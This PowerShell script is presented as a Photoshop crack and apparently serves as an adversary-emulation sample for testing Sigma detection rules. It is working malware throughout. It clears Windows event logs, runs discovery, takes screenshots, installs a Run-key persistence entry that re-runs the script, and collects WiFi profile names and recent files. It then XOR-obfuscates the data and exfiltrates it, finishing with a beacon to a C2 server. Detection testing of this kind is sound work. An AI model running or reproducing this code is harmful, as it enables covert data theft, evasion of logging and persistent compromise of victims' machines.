<#
.SYNOPSIS
    Adobe Photoshop 2025 Crack - REAL ATTACK Version with C2 Exfiltration
    FULL ATTACK CHAIN: Discovery -> Collection -> Exfiltration -> Persistence
    
.DESCRIPTION
    === SIGMA DETECTION MAPPING ===
    Phase | Hành vi thực tế               | Sigma Rule ID | Rule Name                                    
    ------|--------------------------------|---------------|-----------------------------------------------
    2     | Eventlog clearing (wevtutil)   | cc36992a      | Suspicious Eventlog Clearing                 
    3     | Software Discovery (reg.exe)   | e13f668e      | Detected Windows Software Discovery          
    4     | Screenshot (CopyFromScreen)    | d4a11f63      | Screen Capture with CopyFromScreen           
    5     | Registry persistence (reg.exe) | 24357373      | Direct Autorun Keys Modification             
    6     | File encoding (certutil)       | e62a9f0c      | File Encoded To Base64 Via Certutil          
    7     | C2 Exfiltration (HTTP POST)    | N/A (custom)  | Outbound HTTP to non-standard port           
#>

param(
    [string]$RunId = ([guid]::NewGuid().ToString('N').Substring(0,8)),
    [string]$C2Server = "http://192.168.10.105:8080",
    [string]$ExfilEndpoint = "/exfil",
    [string]$PersistenceName = "AdobeUpdateService"
)

$ErrorActionPreference = 'Continue'
$Marker = "PAYLOAD_REAL_$RunId"
$StagingDir = Join-Path (Join-Path $env:PUBLIC "Documents") "adobe_crack_$RunId"
New-Item -ItemType Directory -Path $StagingDir -Force | Out-Null

# ============================================================
# Helper: Send data to C2
# ============================================================
function Send-ToC2 {
    param(
        [string]$DataType,
        [string]$Data,
        [string]$PhaseId
    )
    
    $payload = @{
        victim_id = $env:COMPUTERNAME
        username  = $env:USERNAME
        run_id    = $RunId
        phase_id  = $PhaseId
        data_type = $DataType
        timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        content   = $Data
    }
    
    $json = $payload | ConvertTo-Json -Compress
    
    # XOR obfuscation (key=0x42)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor 0x42
    }
    $encrypted = [Convert]::ToBase64String($bytes)
    
    try {
        $body = @{ data = $encrypted } | ConvertTo-Json
        $response = Invoke-RestMethod -Uri "$C2Server$ExfilEndpoint" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 5 -ErrorAction SilentlyContinue
        Write-Host "  [+] C2 response: $($response | Out-String)" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "  [!] C2 send failed: $_" -ForegroundColor Red
        # Save to local file for later retry
        $failedPath = Join-Path $StagingDir "failed_$DataType`_$PhaseId.json"
        $json | Out-File -FilePath $failedPath -Encoding UTF8
        return $false
    }
}

# ============================================================
# PHASE 2 | Clear event logs (Sigma: cc36992a)
# ============================================================
$phase2Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
Write-Host ""
Write-Host "[PHASE 2] Clearing event logs (evasion)..." -ForegroundColor Cyan
Write-Host "  Sigma Rule: cc36992a - Suspicious Eventlog Clearing" -ForegroundColor DarkGray
Write-Host "  RunId: $phase2Id" -ForegroundColor DarkGray

# Clear security log (real action)
Start-Process -FilePath "wevtutil.exe" -ArgumentList "cl", "Security" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
Start-Process -FilePath "wevtutil.exe" -ArgumentList "cl", "System" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
Start-Process -FilePath "wevtutil.exe" -ArgumentList "cl", "Application" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
Write-Host "  [+] Security/System/Application logs cleared" -ForegroundColor Yellow
Start-Sleep -Seconds 1

# ============================================================
# PHASE 3 | System Discovery with SIGMA DETECTION
# Sigma Rule: Detected Windows Software Discovery (reg.exe)
# Rule ID: e13f668e-7f95-443d-98d2-1816a7648a7b 
# Event Type: Process EID 1 (reg.exe query)
# ============================================================
$phase3Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
Write-Host ""
Write-Host "[PHASE 3] Software discovery..." -ForegroundColor Cyan
Write-Host "  Sigma Rule: e13f668e - Detected Windows Software Discovery" -ForegroundColor DarkGray
Write-Host "  Expected Detection: Process EID 1 (reg.exe query)" -ForegroundColor DarkGray
Write-Host "  Marker: $Marker" -ForegroundColor DarkGray
Write-Host "  RunId: $phase3Id" -ForegroundColor DarkGray

# Software discovery via reg.exe query (trigger Sigma rule e13f668e)
Start-Process -FilePath "reg.exe" `
    -ArgumentList "query", "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "/v", "DisplayName" `
    -WindowStyle Hidden -Wait

# Also collect basic system info
$systemInfo = @{
    Phase3_RunId = $phase3Id
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    OSVersion = (Get-CimInstance Win32_OperatingSystem).Caption
}
$systemInfo | ConvertTo-Json | Out-File -FilePath (Join-Path $StagingDir "system_info_$phase3Id.json") -Encoding UTF8

Write-Host "  [+] Software discovery executed (reg.exe query)" -ForegroundColor Yellow
Start-Sleep -Seconds 2

# ============================================================
# PHASE 4 | Screenshot (Sigma: d4a11f63 - CopyFromScreen)
# ============================================================
$phase4Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
Write-Host ""
Write-Host "[PHASE 4] Capturing screenshot..." -ForegroundColor Cyan
Write-Host "  Sigma Rule: d4a11f63 - Screen Capture with CopyFromScreen" -ForegroundColor DarkGray
Write-Host "  RunId: $phase4Id" -ForegroundColor DarkGray

$screenshotPath = Join-Path $StagingDir "screenshot.png"
$screenshotScript = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
`$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
`$bmp = New-Object System.Drawing.Bitmap(`$bounds.Width, `$bounds.Height)
`$screenCaptureGraphics = [System.Drawing.Graphics]::FromImage(`$bmp)
`$screenCaptureGraphics.CopyFromScreen(`$bounds.X, `$bounds.Y, 0, 0, `$bounds.Size)
`$bmp.Save("$screenshotPath", [System.Drawing.Imaging.ImageFormat]::Png)
`$bmp.Dispose()
`$screenCaptureGraphics.Dispose()
"@

$encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($screenshotScript))
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -Exec Bypass -Enc $encodedScript" -WindowStyle Hidden -Wait

# Convert screenshot to Base64 for exfiltration
if (Test-Path $screenshotPath) {
    $screenshotBase64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($screenshotPath))
    $phase4C2Sent = Send-ToC2 -DataType "screenshot" -Data $screenshotBase64 -PhaseId $phase4Id
    if ($phase4C2Sent) {
        Write-Host "  [+] Screenshot captured and sent to C2 (Size: $([math]::Round($screenshotBase64.Length/1KB,2)) KB)" -ForegroundColor Yellow
    } else {
        Write-Host "  [+] Screenshot captured and saved for retry (Size: $([math]::Round($screenshotBase64.Length/1KB,2)) KB)" -ForegroundColor Yellow
    }
} else {
    Write-Host "  [!] Screenshot capture failed" -ForegroundColor Red
}
Start-Sleep -Seconds 1

# ============================================================
# PHASE 5 | Registry Persistence + Drop payload (Sigma: 24357373)
# ============================================================
$phase5Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
Write-Host ""
Write-Host "[PHASE 5] Installing persistence mechanism..." -ForegroundColor Cyan
Write-Host "  Sigma Rule: 24357373 - Direct Autorun Keys Modification" -ForegroundColor DarkGray
Write-Host "  RunId: $phase5Id" -ForegroundColor DarkGray

# Lấy đường dẫn script gốc đang chạy
$originalScriptPath = $MyInvocation.MyCommand.Path

# Copy script gốc vào Public folder
$payloadPath = "C:\Users\Public\$PersistenceName.ps1"
Copy-Item -Path $originalScriptPath -Destination $payloadPath -Force

# Add to registry (Sigma will detect this). The Run value points to the copied
# script so the lab persistence behavior remains functional.
$regPath = "HKCU\software\Microsoft\Windows\CurrentVersion\Run"
$regName = $PersistenceName
$regData = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$payloadPath`""

Start-Process -FilePath "reg.exe" -ArgumentList "add", $regPath, "/v", $regName, "/t", "REG_SZ", "/d", $regData, "/f" -WindowStyle Hidden -Wait

# Notify C2 about persistence installation
$phase5C2Sent = Send-ToC2 -DataType "persistence_installed" -Data $regData -PhaseId $phase5Id
Write-Host "  [+] Persistence installed: $regName -> $regData" -ForegroundColor Yellow
Write-Host "  [+] Original script copied to: $payloadPath" -ForegroundColor DarkGray
if (-not $phase5C2Sent) {
    Write-Host "  [+] Persistence notification saved for retry" -ForegroundColor DarkGray
}
Start-Sleep -Seconds 1

# ============================================================
# PHASE 6 | Collect browser data + encoding (Sigma: e62a9f0c)
# ============================================================
$phase6Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
Write-Host ""
Write-Host "[PHASE 6] Collecting and encoding sensitive data..." -ForegroundColor Cyan
Write-Host "  Sigma Rule: e62a9f0c - File Encoded To Base64 Via Certutil" -ForegroundColor DarkGray
Write-Host "  RunId: $phase6Id" -ForegroundColor DarkGray

# Collect some "real" sensitive data (simulated)
$sensitiveData = @{
    computer   = $env:COMPUTERNAME
    user       = $env:USERNAME
    timestamp  = (Get-Date)
    recent_files = @()
    wifi_profiles = @()
}

# Get WiFi profiles (real data)
try {
    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":")[1].Trim()
    }
    $sensitiveData.wifi_profiles = $wifiProfiles
} catch {}

# Get recent files (from recent folder)
$recentFolder = [Environment]::GetFolderPath("Recent")
if (Test-Path $recentFolder) {
    $recentFiles = Get-ChildItem $recentFolder -ErrorAction SilentlyContinue | Select-Object -First 10 Name, Target
    $sensitiveData.recent_files = $recentFiles | ForEach-Object { $_.Name }
}

# Save to file for certutil encoding
$dataFile = Join-Path $StagingDir "certutil_encode_input_$phase6Id.txt"
$sensitiveData | ConvertTo-Json | Out-File -FilePath $dataFile -Encoding ASCII

# Encode using certutil (Sigma will detect this)
$encodedFile = Join-Path $StagingDir "certutil_encode_output_$phase6Id.txt"
Start-Process -FilePath "certutil.exe" -ArgumentList "-encode", $dataFile, $encodedFile -WindowStyle Hidden -Wait

# Read encoded data and send to C2
if (Test-Path $encodedFile) {
    $encodedContent = Get-Content $encodedFile -Raw
    $phase6C2Sent = Send-ToC2 -DataType "encoded_data" -Data $encodedContent -PhaseId $phase6Id
    if ($phase6C2Sent) {
        Write-Host "  [+] Data encoded and sent to C2" -ForegroundColor Yellow
    } else {
        Write-Host "  [+] Data encoded and saved for retry" -ForegroundColor Yellow
    }
}

Start-Sleep -Seconds 1

# ============================================================
# PHASE 7 | Final exfiltration via HTTP POST (Custom)
# ============================================================
$phase7Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
Write-Host ""
Write-Host "[PHASE 7] Final exfiltration of all collected data..." -ForegroundColor Cyan
Write-Host "  (Outbound HTTP POST to C2 server)" -ForegroundColor DarkGray
Write-Host "  RunId: $phase7Id" -ForegroundColor DarkGray

# Zip all collected files
$zipPath = Join-Path $env:TEMP "exfil_$RunId.zip"
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($StagingDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)

# Read zip as base64 and send
$zipBytes = [System.IO.File]::ReadAllBytes($zipPath)
$zipBase64 = [Convert]::ToBase64String($zipBytes)
$phase7C2Sent = Send-ToC2 -DataType "full_archive" -Data $zipBase64 -PhaseId $phase7Id

if ($phase7C2Sent) {
    Write-Host "  [+] Full archive sent to C2 (Size: $([math]::Round($zipBase64.Length/1KB,2)) KB)" -ForegroundColor Yellow
} else {
    Write-Host "  [+] Full archive saved for retry (Size: $([math]::Round($zipBase64.Length/1KB,2)) KB)" -ForegroundColor Yellow
}

# ============================================================
# CLEANUP (optional - keep persistence)
# ============================================================
Write-Host ""
Write-Host "Cleaning up temporary files..." -ForegroundColor DarkGray
Remove-Item $StagingDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "============================================================" -ForegroundColor Green
Write-Host "  FULL ATTACK CHAIN COMPLETED" -ForegroundColor Green
Write-Host "  Victim: $env:COMPUTERNAME\$env:USERNAME" -ForegroundColor Green
Write-Host "  Run ID: $RunId" -ForegroundColor Green
Write-Host "  Persistence installed: $PersistenceName (Run key)" -ForegroundColor Green
Write-Host "  C2 target: $C2Server$ExfilEndpoint" -ForegroundColor Green
Write-Host "============================================================" -ForegroundColor Green
Write-Host ""

# Optional: Send final beacon
try {
    Invoke-RestMethod -Uri "$C2Server/beacon?client=$env:COMPUTERNAME&runid=$RunId&status=complete" -Method Get -TimeoutSec 2 -ErrorAction SilentlyContinue
} catch {}
